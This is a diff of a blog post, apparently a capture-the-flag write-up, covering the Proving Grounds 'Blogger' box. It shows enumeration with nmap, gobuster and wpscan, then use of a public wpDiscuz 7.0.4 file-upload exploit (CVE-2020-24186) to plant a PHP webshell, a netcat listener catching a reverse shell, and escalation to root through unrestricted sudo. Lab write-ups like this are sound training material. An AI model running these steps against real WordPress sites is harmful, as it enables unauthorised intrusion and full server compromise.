@@ -3,9 +3,9 @@ layout: post
 author: H4
 ---
 
-[Details](https://www.vulnhub.com/entry/blogger-1,675/)
-This box was customized by Offensive Security and integrated in the 'proving grounds' lab.
-In the following you see the solution of the 'proving grounds' version.
+[Details](https://www.vulnhub.com/entry/blogger-1,675/)  
+This box was customized by Offensive Security and integrated in the 'proving grounds' lab.  
+In the following you see the solution of the 'proving grounds' version.  
 
 # discovery
 
@@ -13,7 +13,7 @@ We are starting with a simple `nmap` scan to identify the attack surface of the 
 
 ## port scan
 ```bash
-$ nmap -Pn 192.168.89.217
+$ nmap -Pn 192.168.89.217    
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-14 13:11 EST
 Nmap scan report for 192.168.89.217
 Host is up (0.024s latency).
@@ -48,12 +48,12 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 2022/11/14 13:13:41 Starting gobuster in directory enumeration mode
 ===============================================================
 /assets               (Status: 301) [Size: 317] [--> http://192.168.89.217/assets/]
-/css                  (Status: 301) [Size: 314] [--> http://192.168.89.217/css/]
+/css                  (Status: 301) [Size: 314] [--> http://192.168.89.217/css/]   
 /images               (Status: 301) [Size: 317] [--> http://192.168.89.217/images/]
-/index.html           (Status: 200) [Size: 46199]
-/index.html           (Status: 200) [Size: 46199]
-/js                   (Status: 301) [Size: 313] [--> http://192.168.89.217/js/]
-
+/index.html           (Status: 200) [Size: 46199]                                  
+/index.html           (Status: 200) [Size: 46199]                                  
+/js                   (Status: 301) [Size: 313] [--> http://192.168.89.217/js/]    
+                                                                                   
 ===============================================================
 2022/11/14 13:15:15 Finished
 ===============================================================
@@ -69,7 +69,7 @@ Checking `/fonts`
 Checking `/blog`
 ![blog](/images/blogger_blog.png)
 
-We identified another blog.
+We identified another blog.  
 Investigating the links reveals that we should add a domain to our `/etc/hosts` file and add the domain `blogger.thm`
 ```bash
 $ cat /etc/hosts
@@ -88,17 +88,17 @@ The source code reveals that it is a `wordpress` instance. So lets start with a 
 ```bash
 $ wpscan --url http://blogger.thm/assets/fonts/blog/ --plugins-detection aggressive
 _______________________________________________________________
-__          _______   _____
-\ \        / /  __ \ / ____|
-\ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
-\ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
-\  /\  /  | |     ____) | (__| (_| | | | |
-\/  \/   |_|    |_____/ \___|\__,_|_| |_|
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
 
-WordPress Security Scanner by the WPScan Team
-Version 3.8.18
-Sponsored by Automattic - https://automattic.com/
-@_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.18
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
 _______________________________________________________________
 
 [+] URL: http://blogger.thm/assets/fonts/blog/ [192.168.89.217]
@@ -109,32 +109,32 @@ Interesting Finding(s):
 [i] Plugin(s) Identified:
 
 [+] akismet
-| Location: http://blogger.thm/assets/fonts/blog/wp-content/plugins/akismet/
-| Last Updated: 2022-11-08T05:36:00.000Z
-| Readme: http://blogger.thm/assets/fonts/blog/wp-content/plugins/akismet/readme.txt
-| [!] The version is out of date, the latest version is 5.0.1
-|
-| Found By: Known Locations (Aggressive Detection)
-|  - http://blogger.thm/assets/fonts/blog/wp-content/plugins/akismet/, status: 200
-|
-| Version: 4.0.8 (100% confidence)
-| Found By: Readme - Stable Tag (Aggressive Detection)
-|  - http://blogger.thm/assets/fonts/blog/wp-content/plugins/akismet/readme.txt
-| Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
-|  - http://blogger.thm/assets/fonts/blog/wp-content/plugins/akismet/readme.txt
+ | Location: http://blogger.thm/assets/fonts/blog/wp-content/plugins/akismet/
+ | Last Updated: 2022-11-08T05:36:00.000Z
+ | Readme: http://blogger.thm/assets/fonts/blog/wp-content/plugins/akismet/readme.txt
+ | [!] The version is out of date, the latest version is 5.0.1
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://blogger.thm/assets/fonts/blog/wp-content/plugins/akismet/, status: 200
+ |
+ | Version: 4.0.8 (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://blogger.thm/assets/fonts/blog/wp-content/plugins/akismet/readme.txt
+ | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - http://blogger.thm/assets/fonts/blog/wp-content/plugins/akismet/readme.txt
 
 [+] wpdiscuz
-| Location: http://blogger.thm/assets/fonts/blog/wp-content/plugins/wpdiscuz/
-| Last Updated: 2022-10-12T19:07:00.000Z
-| Readme: http://blogger.thm/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt
-| [!] The version is out of date, the latest version is 7.5
-|
-| Found By: Known Locations (Aggressive Detection)
-|  - http://blogger.thm/assets/fonts/blog/wp-content/plugins/wpdiscuz/, status: 200
-|
-| Version: 7.0.4 (80% confidence)
-| Found By: Readme - Stable Tag (Aggressive Detection)
-|  - http://blogger.thm/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt
+ | Location: http://blogger.thm/assets/fonts/blog/wp-content/plugins/wpdiscuz/
+ | Last Updated: 2022-10-12T19:07:00.000Z
+ | Readme: http://blogger.thm/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt
+ | [!] The version is out of date, the latest version is 7.5
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://blogger.thm/assets/fonts/blog/wp-content/plugins/wpdiscuz/, status: 200
+ |
+ | Version: 7.0.4 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://blogger.thm/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt
 ...
 ```
 
@@ -146,9 +146,9 @@ Interesting Finding(s):
 # exploitation
 ## looking for an exploit
 ```bash
-$ searchsploit wpdiscuz
+$ searchsploit wpdiscuz  
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-Exploit Title                                                                                                                                                                                            |  Path
+ Exploit Title                                                                                                                                                                                            |  Path
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Wordpress Plugin wpDiscuz 7.0.4 - Arbitrary File Upload (Unauthenticated)                                                                                                                                 | php/webapps/49962.sh
 WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated)                                                                                                                                 | php/webapps/49967.py
@@ -162,7 +162,7 @@ Shellcodes: No Results
 
 ## exploit
 ```bash
-$ python3 /usr/share/exploitdb/exploits/php/webapps/49967.py
+$ python3 /usr/share/exploitdb/exploits/php/webapps/49967.py                                                                    
 [+] Specify an url target
 [+] Example usage: exploit.py -u http://192.168.1.81/blog -p /wordpress/2021/06/blogpost
 [+] Example help usage: exploit.py -h
@@ -173,24 +173,24 @@ $ python3 /usr/share/exploitdb/exploits/php/webapps/49967.py -u http://blogger.t
 [-] File Upload Bypass Vulnerability - PHP Webshell Upload
 [-] CVE: CVE-2020-24186
 [-] https://github.com/hevox
----------------------------------------------------------------
+--------------------------------------------------------------- 
 
 [+] Response length:[60260] | code:[200]
 [!] Got wmuSecurity value: c2e2fa9011
-[!] Got wmuSecurity value: 27
+[!] Got wmuSecurity value: 27 
 
 [+] Generating random name for Webshell...
 [!] Generated webshell name: aulpmqpvdgqvyyc
 
 [!] Trying to Upload Webshell..
-[+] Upload Success... Webshell path:url&quot;:&quot;http://blogger.thm/assets/fonts/blog/wp-content/uploads/2022/11/aulpmqpvdgqvyyc-1668451299.9271.php&quot;
+[+] Upload Success... Webshell path:url&quot;:&quot;http://blogger.thm/assets/fonts/blog/wp-content/uploads/2022/11/aulpmqpvdgqvyyc-1668451299.9271.php&quot; 
 
 > whoami
 
 [x] Failed to execute PHP code...
 ```
 
-It first seems as if the exploit failed.
+It first seems as if the exploit failed.  
 However, if we check the location where the exploit reports it uploaded a shell file and check for a simple code execution, everything seems to work fine.
 
 ### request
@@ -229,7 +229,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ## reverse shell
 ### start listener on attacker machine
 ```bash
-$ nc -lvp 80
+$ nc -lvp 80                                             
 listening on [any] 80 ...
 ```
 
@@ -249,7 +249,7 @@ Connection: close
 
 ### catch connection from target
 ```bash
-$ nc -lvp 80
+$ nc -lvp 80                                             
 listening on [any] 80 ...
 connect to [192.168.49.89] from blogger.thm [192.168.89.217] 42352
 bash: cannot set terminal process group (1374): Inappropriate ioctl for device
@@ -298,11 +298,11 @@ Checking if we have super user permissions reveals that we are allowed to execut
 vagrant@ubuntu-xenial:/home$ sudo -l
 sudo -l
 Matching Defaults entries for vagrant on ubuntu-xenial:
-env_reset, mail_badpass,
-secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User vagrant may run the following commands on ubuntu-xenial:
-(ALL) NOPASSWD: ALL
+    (ALL) NOPASSWD: ALL
 ```
 
 As it is that easy we are using `bash` to escalate to `root`
@@ -330,4 +330,3 @@ cat proof.txt
 ```
 
 Pwned! <@:-)
-
